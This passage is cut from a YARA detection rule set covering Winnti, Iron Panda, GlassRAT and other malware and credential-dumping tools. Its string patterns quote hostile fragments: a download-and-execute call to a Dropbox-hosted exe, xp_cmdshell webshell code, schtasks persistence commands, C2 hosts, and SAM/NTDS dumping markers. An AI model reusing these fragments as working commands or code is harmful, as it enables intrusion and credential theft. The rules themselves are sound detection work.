\"disconnect\" fullword wide\n      $s5 = \"GetClusterResourceTypeKey\" fullword ascii\n      $s6 = \"QueryInformationJobObject\" fullword ascii\n      $s7 = \"interface\" fullword wide\n      $s8 = \"connect\" fullword wide\n      $s9 = \"FreeConsole\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule PHISH_02Dez2015_attach_P_ORD_C_10156_124658_RID3397 : DEMO FILE MAL T1203 T1566_001 {\n   meta:\n      description = \"Phishing Wave - file P-ORD-C-10156-124658.xls\"\n      author = \"Florian Roth\"\n      reference = \"http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/\"\n      date = \"2015-12-02 14:54:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, MAL, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Execute\" ascii\n      $s2 = \"Process WriteParameterFiles\" fullword ascii\n      $s3 = \"WScript.Shell\" fullword ascii\n      $s4 = \"STOCKMASTER\" fullword ascii\n      $s5 = \"InsertEmailFax\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 200KB and all of them\n}\n\nrule GlassRAT_Generic_RID2D0E : DEMO EXE FILE GEN MAL T1218_011 T1543_003 {\n   meta:\n      description = \"Detects GlassRAT Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/peering-into-glassrat/\"\n      date = \"2015-11-23 10:15:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"30d26aebcee21e4811ff3a44a7198a5c519843a24f334880384a7158e07ae399\"\n      hash2 = \"3bdeb3805e9230361fb93c6ffb0bfec8d3aee9455d95b2428c7f6292d387d3a4\"\n      hash3 = \"79993f1912958078c4d98503e00dc526eb1d0ca4d020d17b010efa6c515ca92e\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL, T1218_011, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd.exe /c %s\" fullword ascii\n      $s2 = \"update.dll\" fullword ascii\n      $s3 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\RasAuto\\\\Parameters\" fullword ascii\n      $s4 = \"%%temp%%\\\\%u\" fullword ascii\n      $s5 = \"\\\\off.dat\" ascii\n      $s6 = \"rundll32 \\\"%s\\\",AddNum\" fullword ascii\n      $s7 = \"cmd.exe /c erase /F \\\"%s\\\"\" fullword ascii\n      $s8 = \"SYSTEM\\\\ControlSet00%d\\\\Services\\\\RasAuto\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 15MB and 5 of them\n}\n\nrule Fareit_Trojan_Oct15_RID2E24 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Fareit Trojan from Sep/Oct 2015 Wave\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.cisco.com/security/talos/fareit-analysis\"\n      date = \"2015-10-18 11:01:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"230ca0beba8ae712cfe578d2b8ec9581ce149a62486bef209b04eb11d8c088c3\"\n      hash2 = \"3477d6bfd8313d37fedbd3d6ba74681dd7cb59040cabc2991655bdce95a2a997\"\n      hash3 = \"408fa0bd4d44de2940605986b554e8dab42f5d28a6a525b4bc41285e37ab488d\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ebai.exe\" fullword wide\n      $s2 = \"Origina\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s1 in ( 0 .. 30000 ) and $s2 in ( 0 .. 30000 )\n}\n\nrule Upatre_Hazgurut_RID2D3B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Upatre malware dropped by Downloader - file hazgurut.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://weankor.vxstream-sandbox.com/sample/6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3?environmentId=7\"\n      date = \"2015-10-13 10:23:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7ee0d20b15e24b7fe72154d9521e1959752b4e9c20d2992500df9ac096450a50\"\n      hash2 = \"79ffc620ddb143525fa32bc6a83c636168501a4a589a38cdb0a74afac1ee8b92\"\n      hash3 = \"62d8a6880c594fe9529158b94a9336179fa7a3d3bf1aa9d0baaf07d03b281bd3\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"barcod\" fullword ascii\n      $s0 = \"msports.dll\" fullword ascii\n      $s1 = \"nddeapi.dll\" fullword ascii\n      $s2 = \"glmf32.dll\" fullword ascii\n      $s3 = \"<requestedExecutionLevel level=\\\"requireAdministrator\\\" uiAccess=\\\"false\\\">\" fullword ascii\n      $s4 = \"cmutil.dll\" fullword ascii\n      $s5 = \"mprapi.dll\" fullword ascii\n      $s6 = \"glmf32.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1500KB and $a1 in ( 0 .. 4000 ) and all of ( $s* )\n}\n\nrule Winnti_signing_cert_RID2EE5 : CHINA DEMO EXE FILE G0044 MAL {\n   meta:\n      description = \"Detects a signing certificate used by the Winnti APT group\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/\"\n      date = \"2015-10-10 11:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a9a8dc4ae77b1282f0c8bdebd2643458fc1ceb3145db4e30120dd81676ff9b61\"\n      hash2 = \"9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672\"\n      tags = \"CHINA, DEMO, EXE, FILE, G0044, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Guangzhou YuanLuo Technology Co.\" ascii\n      $s2 = \"Guangzhou YuanLuo Technology Co.,Ltd\" ascii\n      $s3 = \"$Asahi Kasei Microdevices Corporation0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them\n}\n\nrule Winnti_malware_Nsiproxy_RID309D : CHINA DEMO EXE FILE G0044 MAL T1014 T1543_003 {\n   meta:\n      description = \"Detects a Winnti rootkit\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-10-10 12:47:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672\"\n      hash2 = \"cf1e006694b33f27d7c748bab35d0b0031a22d193622d47409b6725b395bffb0\"\n      hash3 = \"326e2cabddb641777d489a9e7a39d52c0dc2dcb1fde1762554ea162792056b6e\"\n      tags = \"CHINA, DEMO, EXE, FILE, G0044, MAL, T1014, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Driver\\\\nsiproxy\" wide\n      $a1 = \"\\\\Device\\\\StreamPortal\" wide\n      $a2 = \"\\\\Device\\\\PNTFILTER\" wide\n      $s1 = \"Cookie: SN=\" fullword ascii\n      $s2 = \"\\\\BaseNamedObjects\\\\_transmition_synchronization_\" wide\n      $s3 = \"Winqual.sys\" fullword wide\n      $s4 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\" wide\n      $s5 = \"http://www.wasabii.com.tw 0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $x1 and 1 of ( $a* ) and 2 of ( $s* )\n}\n\nrule Winnti_malware_UpdateDLL_RID3070 : CHINA DEMO EXE FILE G0044 MAL T1543_003 {\n   meta:\n      description = \"Detects a Winnti malware - Update.dll\"\n      author = \"Florian Roth\"\n      reference = \"VTI research\"\n      date = \"2015-10-10 12:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1b449121300b0188ff9f6a8c399fb818d0cf53fd36cf012e6908a2665a27f016\"\n      hash2 = \"50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a\"\n      hash3 = \"6cdb65dbfb2c236b6d149fd9836cb484d0608ea082cf5bd88edde31ad11a0d58\"\n      tags = \"CHINA, DEMO, EXE, FILE, G0044, MAL, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $c1 = \"'Wymajtec$Tima Stempijg Sarviges GA -$G2\" fullword ascii\n      $c2 = \"AHDNEAFE1.sys\" fullword ascii\n      $c3 = \"SOTEFEHJ3.sys\" fullword ascii\n      $c4 = \"MainSYS64.sys\" fullword ascii\n      $s1 = \"\\\\Registry\\\\User\\\\%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" wide\n      $s2 = \"Update.dll\" fullword ascii\n      $s3 = \"\\\\\\\\.\\\\pipe\\\\usbpcex%d\" fullword wide\n      $s4 = \"\\\\\\\\.\\\\pipe\\\\usbpcg%d\" fullword wide\n      $s5 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\" wide\n      $s6 = \"\\\\??\\\\pipe\\\\usbpcg%d\" fullword wide\n      $s7 = \"\\\\??\\\\pipe\\\\usbpcex%d\" fullword wide\n      $s8 = \"HOST: %s\" fullword ascii\n      $s9 = \"$$$--Hello\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( ( 1 of ( $c* ) and 3 of ( $s* ) ) or all of ( $s* ) )\n}\n\nrule Winnti_malware_FWPK_RID2E69 : CHINA DEMO EXE FILE G0044 MAL T1543_003 {\n   meta:\n      description = \"Detects a Winnti malware - FWPKCLNT.SYS\"\n      author = \"Florian Roth\"\n      reference = \"VTI research\"\n      date = \"2015-10-10 11:13:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"1098518786c84b0d31f215122275582bdcd1666653ebc25d50a142b4f5dabf2c\"\n      hash2 = \"9a684ffad0e1c6a22db1bef2399f839d8eff53d7024fb014b9a5f714d11febd7\"\n      hash3 = \"a836397817071c35e24e94b2be3c2fa4ffa2eb1675d3db3b4456122ff4a71368\"\n      tags = \"CHINA, DEMO, EXE, FILE, G0044, MAL, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\\\\" wide\n      $s1 = \"%x:%d->%x:%d, Flag %s%s%s%s%s, seq %u, ackseq %u, datalen %u\" fullword ascii\n      $s2 = \"FWPKCLNT.SYS\" fullword ascii\n      $s3 = \"Port Layer\" fullword wide\n      $s4 = \"%x->%x, icmp type %d, code %d\" fullword ascii\n      $s5 = \"\\\\BaseNamedObjects\\\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28E}\" wide\n      $s6 = \"\\\\Ndi\\\\Interfaces\" wide\n      $s7 = \"\\\\Device\\\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}\" wide\n      $s8 = \"Bad packet\" fullword ascii\n      $s9 = \"\\\\BaseNamedObjects\\\\EKV0000000000\" wide\n      $s10 = \"%x->%x\" fullword ascii\n      $s11 = \"IPInjectPkt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 642KB and all of them\n}\n\nrule Winnti_malware_StreamPortal_Gen_RID3388 : CHINA DEMO EXE FILE G0044 GEN MAL {\n   meta:\n      description = \"Detects a Winnti malware - Streamportal\"\n      author = \"Florian Roth\"\n      reference = \"VTI research\"\n      date = \"2015-10-10 14:51:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"326e2cabddb641777d489a9e7a39d52c0dc2dcb1fde1762554ea162792056b6e\"\n      hash2 = \"9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672\"\n      hash3 = \"aff7c7478fe33c57954b6fec2095efe8f9edf5cdb48a680de9439ba62a77945f\"\n      tags = \"CHINA, DEMO, EXE, FILE, G0044, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Proxies destination address/port for TCP\" fullword wide\n      $s3 = \"\\\\Device\\\\StreamPortal\" wide\n      $s4 = \"Transport-Data Proxy Sub-Layer\" fullword wide\n      $s5 = \"Cookie: SN=\" fullword ascii\n      $s6 = \"\\\\BaseNamedObjects\\\\_transmition_synchronization_\" wide\n      $s17 = \"NTOSKRNL.EXE\" fullword wide\n      $s19 = \"FwpsReferenceNetBufferList0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 275KB and all of them\n}\n\nrule Indetectables_RAT_RID2D8E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux\"\n      author = \"Florian Roth\"\n      reference = \"http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/\"\n      date = \"2015-10-01 10:36:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105\"\n      hash2 = \"66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229\"\n      hash3 = \"1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Coded By M3\" fullword wide\n      $s2 = \"Stub Undetector M3\" fullword wide\n      $s3 = \"www.webmenegatti.com.br\" wide\n      $s4 = \"M3n3gatt1\" fullword wide\n      $s5 = \"TheMisterFUD\" fullword wide\n      $s6 = \"KillZoneKillZoneKill\" fullword ascii\n      $s7 = \"[[__M3_F_U_D_M3__]]$\" fullword ascii\n      $s8 = \"M3_F_U_D_M3\" ascii\n      $s9 = \"M3n3gatt1hack3r\" fullword wide\n      $s10 = \"M3n3gatt1hack3r\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 1 of them\n}\n\nrule BergSilva_Malware_RID2DB8 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a malware from the same author as the Indetectables RAT\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-10-01 10:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e\"\n      hash2 = \"6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\Berg Silva\\\\Desktop\\\\\" wide\n      $x2 = \"URLDownloadToFileA 0, \\\"https://dl.dropbox.com/u/105015858/nome.exe\\\", \\\"c:\\\\nome.exe\\\", 0, 0\" fullword wide\n      $s1 = \" Process.Start (Path.GetTempPath() & \\\"name\\\" & \\\".exe\\\") 'start server baixado\" fullword wide\n      $s2 = \"FileDelete(@TempDir & \\\"\\\\nome.exe\\\") ;Deleta o Arquivo para que possa ser executado normalmente\" fullword wide\n      $s3 = \" Lib \\\"\\\\WINDOWS\\\\system32\\\\UsEr32.dLl\\\"\" fullword wide\n      $s4 = \"$Directory = @TempDir & \\\"\\\\nome.exe\\\" ;Define a variavel\" fullword wide\n      $s5 = \"https://dl.dropbox.com/u/105015858\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or 2 of ( $s* ) )\n}\n\nrule VSSown_VBS_RID2AAB : DEMO HKTL SCRIPT T1047 {\n   meta:\n      description = \"Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-10-01 07:36:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, SCRIPT, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Select * from Win32_Service Where Name ='VSS'\" ascii\n      $s1 = \"Select * From Win32_ShadowCopy\" ascii\n      $s2 = \"cmd /C mklink /D \" ascii\n      $s3 = \"ClientAccessible\" ascii\n      $s4 = \"WScript.Shell\" ascii\n      $s5 = \"Win32_Process\" ascii\n   condition: \n      all of them\n}\n\nrule QuarksPwDump_Gen_RID2D5E : DEMO GEN HKTL {\n   meta:\n      description = \"Detects all QuarksPWDump versions\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-09-29 10:28:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa\"\n      hash2 = \"87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f\"\n      hash3 = \"a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9\"\n      tags = \"DEMO, GEN, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"OpenProcessToken() error: 0x%08X\" fullword ascii\n      $s2 = \"%d dumped\" fullword ascii\n      $s3 = \"AdjustTokenPrivileges() error: 0x%08X\" fullword ascii\n      $s4 = \"\\\\SAM-%u.dmp\" ascii\n   condition: \n      all of them\n}\n\nrule APT_MAL_CN_Unit78020_Sep15_RID2F0C : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware used by Unit78020\"\n      author = \"Florian Roth\"\n      reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n      date = \"2015-09-24 11:40:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-31\"\n      hash1 = \"2b15e614fb54bca7031f64ab6caa1f77b4c07dac186826a6cd2e254090675d72\"\n      hash2 = \"76c586e89c30a97e583c40ebe3f4ba75d5e02e52959184c4ce0a46b3aac54edd\"\n      hash3 = \"7b73bf2d80a03eb477242967628da79924fbe06cc67c4dcdd2bdefccd6e0e1af\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"greensky27.vicp.net\" fullword wide\n      $x2 = \"POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1\" fullword ascii\n      $x3 = \"GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1\" fullword ascii\n      $x4 = \"serch.vicp.net\" fullword wide\n      $x5 = \"greensky27.vicp.net\" fullword wide\n      $x6 = \"greensky27.vicp.net.as\" fullword wide\n      $x7 = \"greensky27.vcip.net\" fullword wide\n      $x8 = \"pnoc-ec.vicp.net\" fullword wide\n      $x9 = \"aseanph.vicp.net\" fullword wide\n      $x10 = \"pnoc.vicp.net\" fullword wide\n      $sa1 = \"dMozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.0; .NET CLR 1.1.4322)\" wide fullword\n      $sa2 = \"x-www-form-urlencoded/r/n\" wide fullword\n      $sa3 = \"/%d%s%d\" ascii fullword\n      $sa4 = \"dMozilla\" wide fullword\n      $sa5 = \"Accept-Language:En-us\" wide fullword\n      $sb1 = \"%USERPROFILE%\\\\Application Data\\\\Mozilla\\\\Firefox\\\\Profiles\" wide fullword\n      $sb2 = \"\\\\Office Start.lnk\" wide fullword\n      $sb3 = \"%02d-%02d-%02d %02d:%02d\" wide fullword\n      $sc1 = \"\\\\MSN Talk Start.lnk\" wide fullword\n      $sc2 = \"-GetModuleFileNameExW\" ascii fullword\n      $sc3 = \"dwError1 = %d\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or all of ( $sa* ) or all of ( $sb* ) or all of ( $sc* ) )\n}\n\nrule Unit78020_Malware_1_RID2D6A : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects malware by Chinese APT PLA Unit 78020 - Specific Rule - msictl.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n      date = \"2015-09-24 10:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%ProgramFiles%\\\\Internet Explorer\\\\iexplore.exe\" fullword ascii\n      $s2 = \"msictl.exe\" fullword ascii\n      $s3 = \"127.0.0.1:8080\" fullword ascii\n      $s4 = \"mshtml.dat\" fullword ascii\n      $s5 = \"msisvc\" fullword ascii\n      $s6 = \"NOKIAN95/WEB\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 160KB and 4 of them\n}\n\nrule Unit78020_Malware_Gen2_RID2E85 : APT CHINA DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule\"\n      author = \"Florian Roth\"\n      reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n      date = \"2015-09-24 11:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"76c586e89c30a97e583c40ebe3f4ba75d5e02e52959184c4ce0a46b3aac54edd\"\n      hash2 = \"7b73bf2d80a03eb477242967628da79924fbe06cc67c4dcdd2bdefccd6e0e1af\"\n      hash3 = \"981e2fa1ae4145359036b46e8b53cc5da37dd2311204859761bd91572f025e8a\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"-GetModuleFileNameExW\" fullword ascii\n      $s1 = \"\\\\MSN Talk Start.lnk\" wide\n      $s2 = \":SeDebugPrivilege\" fullword wide\n      $s3 = \"WinMM Version 1.0\" fullword wide\n      $s4 = \"dwError1 = %d\" fullword ascii\n      $s5 = \"*Can't Get\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule Unit78020_Malware_Gen3_RID2E86 : APT CHINA DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule - Chong\"\n      author = \"Florian Roth\"\n      reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n      date = \"2015-09-24 11:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2625a0d91d3cdbbc7c4a450c91e028e3609ff96c4f2a5a310ae20f73e1bc32ac\"\n      hash2 = \"5c62b1d16e6180f22a0cb59c99a7743f44cb4a41e4e090b9733d1fb687c8efa2\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"GET http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n      $x2 = \"POST http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n      $x3 = \"J:\\\\chong\\\\\" ascii\n      $s1 = \"User-Agent: Netscape\" fullword ascii\n      $s2 = \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7\" fullword ascii\n      $s3 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\explorer\\\\User Shell Folders\" fullword wide\n      $s4 = \"J:\\\\chong\\\\nod\\\\Release\\\\SslMM.exe\" fullword ascii\n      $s5 = \"MM.exe\" fullword ascii\n      $s6 = \"network.proxy.ssl\" fullword wide\n      $s7 = \"PeekNamePipe\" fullword ascii\n      $s8 = \"Host: %ws:%d\" fullword ascii\n      $s9 = \"GET %dHTTP/1.1\" fullword ascii\n      $s10 = \"SCHANNEL.DLL\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) ) or 4 of ( $s* )\n}\n\nrule IronPanda_DNSTunClient_RID2F67 : APT CHINA DEMO EXE T1053_005 {\n   meta:\n      description = \"Iron Panda malware DnsTunClient - file named.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 11:55:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXE, T1053_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dnstunclient -d or -domain <domain>\" fullword ascii\n      $s2 = \"dnstunclient -ip <server ip address>\" fullword ascii\n      $s3 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /C schtasks /create /tn \\\"\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\Microsoft Windows\\\" /tr \" fullword ascii\n      $s4 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /C schtasks /create /tn \\\"Microsoft Windows\\\" /tr \" fullword ascii\n      $s5 = \"taskkill /im conime.exe\" fullword ascii\n      $s6 = \"\\\\dns control\\\\t-DNSTunnel\\\\DnsTunClient\\\\DnsTunClient.cpp\" ascii\n      $s7 = \"UDP error:can not bing the port(if there is unclosed the bind process?)\" fullword ascii\n      $s8 = \"use error domain,set domain pls use -d or -domain mark(Current: %s,recv %s)\" fullword ascii\n      $s9 = \"error: packet num error.the connection have condurt,pls try later\" fullword ascii\n      $s10 = \"Coversation produce one error:%s,coversation fail\" fullword ascii\n      $s11 = \"try to add many same pipe to select group(or mark is too easy).\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them ) or 5 of them\n}\n\nrule IronPanda_Malware1_RID2DE6 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Iron Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 10:51:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"activedsimp.dll\" fullword wide\n      $s1 = \"get_BadLoginAddress\" fullword ascii\n      $s2 = \"get_LastFailedLogin\" fullword ascii\n      $s3 = \"ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED\" fullword ascii\n      $s4 = \"get_PasswordExpirationDate\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule IronPanda_Webshell_JSP_RID2F6E : APT CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Iron Panda Malware JSP\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 11:56:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bin_ExecSql(\\\"exec master..xp_cmdshell'bcp \\\\\\\"select safile from \\\" + db + \\\"..bin_temp\\\\\\\" queryout \\\\\\\"\\\" + Bin_TextBox_SaveP\" ascii\n      $s2 = \"tc.Text=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('zcg_ClosePM','\\\"+Bin_ToBase64(de.Key.ToString())+\\\"')\\\\\\\">Close</a>\\\";\" fullword ascii\n      $s3 = \"Bin_ExecSql(\\\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\\\");\" fullword ascii\n   condition: \n      filesize < 330KB and 1 of them\n}\n\nrule IronPanda_Malware_Htran_RID3011 : APT CHINA DEMO EXE T1020 T1090 {\n   meta:\n      description = \"Iron Panda Malware Htran\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 12:24:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXE, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[-] Gethostbyname(%s) error:%s\" fullword ascii\n      $s2 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n      $s3 = \"-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s4 = \"[-] ERROR: Must supply logfile name.\" fullword ascii\n      $s5 = 